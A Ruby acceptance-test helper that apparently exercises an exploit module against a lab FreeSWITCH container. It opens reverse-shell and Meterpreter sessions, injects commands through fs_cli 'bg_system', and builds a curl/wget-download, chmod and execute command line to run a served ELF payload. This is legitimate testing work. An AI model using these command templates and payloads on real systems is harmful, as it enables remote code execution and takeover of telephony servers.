# frozen_string_literal: true

require 'base64'
require 'English'
require 'timeout'
require_relative '../freeswitch_execution/acceptance'

module Acceptance
  # Preserve the qualified command fixture; keep payload lifecycle controls here.
  module FreeSwitchSessions
    include FreeSwitchExecution

    CALLBACK = 4482
    FETCH = 8087
    DIRECTORY = '/tmp/module-target-fs-session'
    UNIX_PAYLOADS = %w[cmd/unix/reverse_bash cmd/unix/reverse_perl cmd/unix/reverse].freeze
    LINUX_PAYLOADS = %w[linux/x86/shell_reverse_tcp linux/x64/shell_reverse_tcp linux/x86/meterpreter/reverse_tcp linux/x64/meterpreter/reverse_tcp].freeze

    def ss_poll(seconds, &block)
      Timeout.timeout(seconds) { wait_for_expect(300, 0.1, &block) }
    end

    def ss_record(name, value)
      fx_record(name, value)
    end

    def ss_cleanup(label, actions)
      original = $ERROR_INFO
      failures = []
      actions.each do |action|
        action.call
      rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
        failures << "#{e.class}: #{e.message}"
      end
      ss_record('cleanup-boundaries.jsonl', label: label, original_error: original&.message, cleanup_errors: failures)
      raise IOError, "#{label} cleanup failed: #{failures.join('; ')}" if !original && !failures.empty?
    end

    def ss_processes
      JSON.parse(target_exec('target', 'perl', '/session_lab/process_state.pl', CALLBACK.to_s))
    end

    def ss_listeners(port)
      code = 'puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map{|path|File.readlines(path).drop(1).map(&:split)}.select{|row|row[3]=="0A"&&row[1].split(":").last.to_i(16)==Integer(ARGV[0])})'
      JSON.parse(target_exec('framework', 'ruby', '-rjson', '-e', code, port.to_s))
    end

    def ss_rows
      raise ArgumentError, 'Invalid controlled workspace' unless @workspace.match?(/\Afs_session_[0-9_]+\z/)

      JSON.parse(fs_sql("SELECT coalesce(json_agg(row_to_json(session) ORDER BY session.id),'[]'::json) FROM sessions session JOIN hosts host ON host.id=session.host_id JOIN workspaces workspace ON workspace.id=host.workspace_id WHERE workspace.name='#{@workspace}'"))
    end

    def ss_idle
      expect(fx_json('framework.sessions.keys')).to eq([])
      expect(fx_json('framework.jobs.keys')).to eq([])
      [CALLBACK, FETCH].each { |port| ss_poll(10) { expect(ss_listeners(port)).to eq([]) } }
      ss_poll(10) { expect(ss_processes.fetch('connections').reject { |row| row.fetch('state') == '06' }).to eq([]) }
      ss_poll(15) { expect(target_exec('target', 'find', DIRECTORY, '-mindepth', '1', '-maxdepth', '1', '-print')).to eq('') }
      expect(ss_rows).to all(include('closed_at' => be_a(String)))
    end

    def ss_options(payload)
      options = { 'TARGET' => payload.start_with?('linux/') ? 1 : 0, 'PAYLOAD' => payload, 'PASSWORD' => @password, 'LHOST' => listener_host, 'LPORT' => CALLBACK, 'WfsDelay' => 20, 'ConnectTimeout' => 3, 'VERBOSE' => true }
      options.merge!('CMDSTAGER::FLAVOR' => @family, 'CMDSTAGER::TEMP' => DIRECTORY + '/', 'SRVHOST' => listener_host, 'SRVPORT' => FETCH) if payload.start_with?('linux/')
      options
    end

    def ss_ready(payload, owner)
      identifier = nil
      ss_poll(35) do
        rows = fx_json('framework.sessions.values.map { |session| {id:session.sid,type:session.type,owner:session.via_exploit} }')
        expect(rows.length).to eq(1)
        expect(rows.first).to include('type' => payload.include?('meterpreter') ? 'meterpreter' : 'shell', 'owner' => owner)
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line).fetch('id') }
        identifier = rows.first.fetch('id')
        expect(events).to include(identifier)
      end
      identifier
    end

    def ss_vendor_wrapper?(process)
      process.fetch('state') == 'Z' && process.fetch('name') == 'freeswitch' && process.fetch('ppid') == @engine_pid &&
        process.fetch('uid') == Integer(@uid) && process.fetch('cmdline').empty? && process.fetch('exe').nil? && process.fetch('connection_inodes').empty?
    end

    def ss_new_processes(snapshot)
      snapshot.fetch('processes').reject do |process|
        @before_processes.any? { |before| before.values_at('pid', 'starttime') == process.values_at('pid', 'starttime') } ||
          process.fetch('cmdline').include?('/lab/start.sh health') || process.fetch('name') == 'fs_cli' || process.fetch('name') == 'grep' || ss_vendor_wrapper?(process)
      end
    end

    def ss_live_payload_processes(snapshot, tracked)
      snapshot.fetch('processes').select do |process|
        tracked.any? { |prior| prior.values_at('pid', 'starttime') == process.values_at('pid', 'starttime') } && !ss_vendor_wrapper?(process)
      end
    end

    def ss_use_close(identifier, payload, owner)
      marker = "fs-session-#{@case}-#{identifier}"
      path = '/tmp/module-target-log4shell-own-' + marker
      begin
        proof = fx_json("FreeSwitchExecutionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect})")
        expect(proof).to include('via_exploit' => owner, 'via_payload' => 'payload/' + payload)
        expect(proof.fetch('peer')).to start_with(target_runtime.fetch('module_endpoints').fetch('target').fetch('host') + ':')
        expect(target_exec('target', 'cat', path)).to eq(marker)
        expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq(@uid)
        snapshot = ss_processes
        connected = snapshot.fetch('processes').reject { |process| process.fetch('connection_inodes').empty? }
        expect(connected).not_to be_empty
        expect(connected).to all(include('uid' => Integer(@uid), 'state' => be_a(String), 'starttime' => be_a(String)))
        expect(connected.map { |process| process.fetch('pid') }).to include(proof.fetch('pid')) if proof.fetch('type') == 'meterpreter'
        expect(ss_rows.map { |row| row.fetch('id') }).to include(proof.fetch('db_id'))
        payload_processes = ss_new_processes(snapshot)
        expect(payload_processes).not_to be_empty
        record = { payload: payload, owner: owner, proof: proof, connections: snapshot.fetch('connections'), payload_processes: payload_processes }
        yield record if block_given?
        vendor_children = snapshot.fetch('processes').select { |process| ss_vendor_wrapper?(process) && @before_processes.none? { |prior| prior.values_at('pid', 'starttime') == process.values_at('pid', 'starttime') } }
        maximum = record[:executable] ? record.fetch(:executable).fetch('commands').length : 1
        expect(vendor_children.length).to be <= maximum
        record[:native_provider_defunct_children] = vendor_children
        record[:native_provider_child_bound] = maximum
        ss_record('session-proofs-before-close.jsonl', record)
        record[:close] = fx_json("FreeSwitchExecutionControl.close(framework,#{identifier})")
        # The stock double-telnet payload includes a long sleep feeder. Only its
        # observed, new, non-socket-owning sleep may receive explicit cleanup.
        if payload == 'cmd/unix/reverse'
          ss_processes.fetch('processes').each do |process|
            prior = payload_processes.find { |entry| entry.values_at('pid', 'starttime') == process.values_at('pid', 'starttime') }
            next unless prior && process.fetch('name') == 'sleep' && process.fetch('cmdline').match?(/\Asleep \d+\s*\z/) && process.fetch('connection_inodes').empty?

            expect(process.fetch('uid')).to eq(Integer(@uid))
            cleanup = JSON.parse(target_exec('target', 'perl', '/session_lab/terminate_sleep.pl', process.fetch('pid').to_s, process.fetch('starttime'), @uid))
            expect(cleanup.fetch('status')).to match(/\A(?:signalled|already_absent)\z/)
            ss_record('intentional-telnet-feeder-cleanup.jsonl', process: process, payload: payload, owner: owner, cleanup: cleanup)
          end
        end
        ss_poll(20) do
          # A live API launcher can become the exact native provider zombie only
          # after the payload exits. Reclassify its current state at this boundary.
          expect(ss_live_payload_processes(ss_processes, payload_processes)).to eq([])
        end
        ss_poll(15) { expect(fx_json('framework.sessions.keys')).to eq([]) }
        ss_poll(15) { expect(ss_rows.find { |row| row.fetch('id') == proof.fetch('db_id') }.fetch('closed_at')).not_to be_nil }
        record[:all_tracked_live_payload_processes_absent] = true
        record[:remaining_native_provider_defunct_children] = ss_processes.fetch('processes').select { |process| ss_vendor_wrapper?(process) }
        new_vendor_children = record[:remaining_native_provider_defunct_children].reject do |process|
          @before_processes.any? { |prior| prior.values_at('pid', 'starttime') == process.values_at('pid', 'starttime') }
        end
        expect(new_vendor_children.length).to be <= maximum
        ss_record('session-lifecycles.jsonl', record)
      ensure
        target_exec('target', 'rm', '-f', '--', path)
      end
    end

    def ss_native_http(source)
      journal = File.join(target_runtime.fetch('artifacts'), "native-http-#{@case}.jsonl")
      argv = target_runtime.fetch('compose') + ['exec', '-T', 'framework', 'bundle', 'exec', 'ruby', 'test/module_targets/freeswitch_sessions/native_http.rb', listener_host, FETCH.to_s, source, journal]
      Open3.popen3(*argv) do |input, output, errors, wait|
        expect(IO.select([output], nil, nil, 10)).not_to be_nil
        expect(output.gets).to eq("FS_NATIVE_HTTP_READY\n")
        yield "http://#{listener_host}:#{FETCH}/native"
      ensure
        ss_cleanup('native HTTP', [
          -> { input.puts('STOP') unless input.closed? },
          -> { input.close },
          lambda do
            expect(wait.join(10)).not_to be_nil
            expect(wait.value.exitstatus).to eq(0), errors.read
            expect(output.read).to eq('')
          end
        ])
      end
      rows = File.readlines(journal).map { |line| JSON.parse(line) }
      expect(rows.last).to include('method' => 'GET', 'path' => '/native', 'peer' => target_runtime.fetch('module_endpoints').fetch('target').fetch('host'), 'sha256' => Digest::SHA256.file(source).hexdigest)
    end

    def ss_native(payload)
      native_path = DIRECTORY + '/native-' + @case
      record = { payload: payload, owner_calls: 0 }
      begin
        @before_processes = ss_processes.fetch('processes')
        console_command('back')
        console_command('use exploit/multi/handler')
        constraints = fx_json("FreeSwitchExecutionControl.constraints(active_module,framework,#{payload.start_with?('linux/') ? 1 : 0})")
        expect(constraints.fetch('badchars')).to eq(payload.start_with?('linux/') ? [] : [0, 10, 13, 39, 92])
        { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => CALLBACK, 'ExitOnSession' => false }.each { |name, value| console_command("set #{name} #{value}") }
        expect(console_command('run -j -z')).not_to include('[-]')
        jobs = fx_json('framework.jobs.keys')
        expect(jobs.length).to eq(1)
        generated = fx_json("FreeSwitchExecutionControl.generated(framework.jobs.fetch(#{jobs.first.inspect}),#{payload.inspect},framework)")
        record[:generated] = generated
        ss_poll(15) { expect(ss_listeners(CALLBACK)).not_to be_empty }
        execute = lambda do |command|
          output = target_exec('target', 'fs_cli', '-p', @password, '-x', "bg_system #{command}")
          record[:native_api_reply] = output
          expect(output).to include('+OK')
          identifier = ss_ready(payload, 'exploit/multi/handler')
          ss_use_close(identifier, payload, 'exploit/multi/handler')
        end
        if payload.start_with?('linux/')
          bytes = Base64.strict_decode64(generated.fetch('executable_base64'))
          expect(bytes.getbyte(4)).to eq(payload.start_with?('linux/x64/') ? 2 : 1)
          local = File.join(target_runtime.fetch('artifacts'), 'native-' + @case + '.elf')
          File.binwrite(local, bytes)
          ss_native_http(local) do |url|
            download = @family == 'curl' ? "curl -fsS -o #{native_path} #{url}" : "wget -q -O #{native_path} #{url}"
            execute.call("#{download};chmod 700 #{native_path};#{native_path}")
            expect(target_exec('target', 'sha256sum', native_path)).to start_with(generated.fetch('executable_sha256'))
          end
        else
          command = Base64.strict_decode64(generated.fetch('command_base64'))
          expect(command.bytes & constraints.fetch('badchars')).to eq([])
          execute.call(command)
        end
        record[:status] = 'native_passed'
      ensure
        error = $ERROR_INFO
        record[:failure] = "#{error.class}: #{error.message}" if error
        record[:status] = 'setup_failed' if error
        ss_cleanup('native session', [-> { console_command('sessions -K') }, -> { console_command('jobs -K') }, -> { target_exec('target', 'rm', '-f', '--', native_path) }])
        ss_record('native-session-calibrations.jsonl', record)
      end
      ss_idle
    end

    def ss_finish_capture(capture, payload, iteration, executable)
      capture.fetch(:input).puts('STOP')
      capture.fetch(:input).close
      expect(capture.fetch(:wait).join(10)).not_to be_nil
      raw = capture.fetch(:output).read
      error = capture.fetch(:errors).read
      stem = "#{@case}-#{iteration}-#{capture.fetch(:port)}"
      File.write(File.join(target_runtime.fetch('artifacts'), stem + '-wire.json'), raw)
      expect(capture.fetch(:wait).value.exitstatus).to eq(0), error
      streams = fs_streams(JSON.parse(raw).fetch('packets')).map do |stream|
        bytes = stream.delete(:text).b
        stream.merge(base64: Base64.strict_encode64(bytes), sha256: Digest::SHA256.hexdigest(bytes))
      end
      ss_record('session-wire.jsonl', payload: payload, iteration: iteration, port: capture.fetch(:port), streams: streams)
      if capture.fetch(:port) == 8021
        requests = streams.select { |stream| stream.fetch(:direction) == 'request' }.map { |stream| Base64.strict_decode64(stream.fetch(:base64)) }.join
        expect(requests).to include("auth #{@password}\n\n".b, 'api bg_system '.b)
      elsif executable
        values = streams.map { |stream| Base64.strict_decode64(stream.fetch(:base64)) }
        expect(values.any? { |bytes| bytes.start_with?('GET ') }).to be(true)
        response = values.find { |bytes| bytes.start_with?('HTTP/1.') }
        expect(response).not_to be_nil
        header, body = response.split("\r\n\r\n", 2)
        expect(header).to match(%r{\AHTTP/1\.[01] 200 })
        expect(body.bytesize).to eq(executable.fetch('bytes'))
        expect(Digest::SHA256.hexdigest(body)).to eq(executable.fetch('sha256'))
        ss_record('owning-http-executables.jsonl', payload: payload, iteration: iteration, executable: executable, header: header)
      end
    end

    def ss_owner(payload)
      2.times do |iteration|
        @before_processes = ss_processes.fetch('processes')
        options = ss_options(payload)
        captures = []
        output = nil
        owner_started = false
        cached_executable = nil
        begin
          ports = payload.start_with?('linux/') ? [8021, FETCH] : [8021]
          ports.each do |port|
            capture_runtime = ENV.fetch('MODULE_TARGET_RUNTIME')
            if port == FETCH
              # The shared observer filters the server's port. For downloads,
              # the target initiates HTTP and Framework serves the executable.
              view = { listener_host: target_runtime.fetch('module_endpoints').fetch('target').fetch('host'), module_endpoints: { framework: { host: listener_host } } }
              capture_runtime = File.join(target_runtime.fetch('artifacts'), "http-capture-runtime-#{@case}-#{iteration}.json")
              File.write(capture_runtime, JSON.generate(view))
            end
            argv = target_runtime.fetch('compose') + ['exec', '-T', 'framework', 'ruby', 'test/module_targets/freeswitch/capture.rb', capture_runtime, port.to_s]
            input, output, errors, wait = Open3.popen3(*argv)
            captures << { port: port, input: input, output: output, errors: errors, wait: wait }
            expect(IO.select([output], nil, nil, 8)).not_to be_nil
            expect(output.gets).to eq("FREESWITCH_CAPTURE_READY\n")
          end
          owner_started = true
          output = run_target_module(EXEC_OWNER, 'target', options, action: 'run -z', allow_errors: true, command_timeout: 65)
          ss_record('owning-session-calls.jsonl', payload: payload, options: options, iteration: iteration, output: output)
          expect(output).to include('Login success')
          expect(output).not_to include('Exploit completed, but no session was created', 'Exploit failed')
          identifier = ss_ready(payload, EXEC_OWNER)
          ss_use_close(identifier, payload, EXEC_OWNER) do |record|
            if payload.start_with?('linux/')
              executable = fx_json("FreeSwitchExecutionControl.owner_executable(framework,#{identifier})")
              expect(executable.fetch('elf_class')).to eq(payload.start_with?('linux/x64/') ? 2 : 1)
              cached_executable = executable
              record[:executable] = executable
            end
          end
        ensure
          ss_record('owning-session-results.jsonl', payload: payload, iteration: iteration, called: owner_started, wrapper_returned: !output.nil?, output: output || console.all_data)
          actions = captures.map { |capture| -> { ss_finish_capture(capture, payload, iteration, cached_executable) } }
          actions += [-> { console_command('sessions -K') }, -> { console_command('jobs -K') }]
          ss_cleanup('owning session', actions)
        end
        ss_idle
        expect(fs_state).to eq(@state)
      end
    end
  end
end
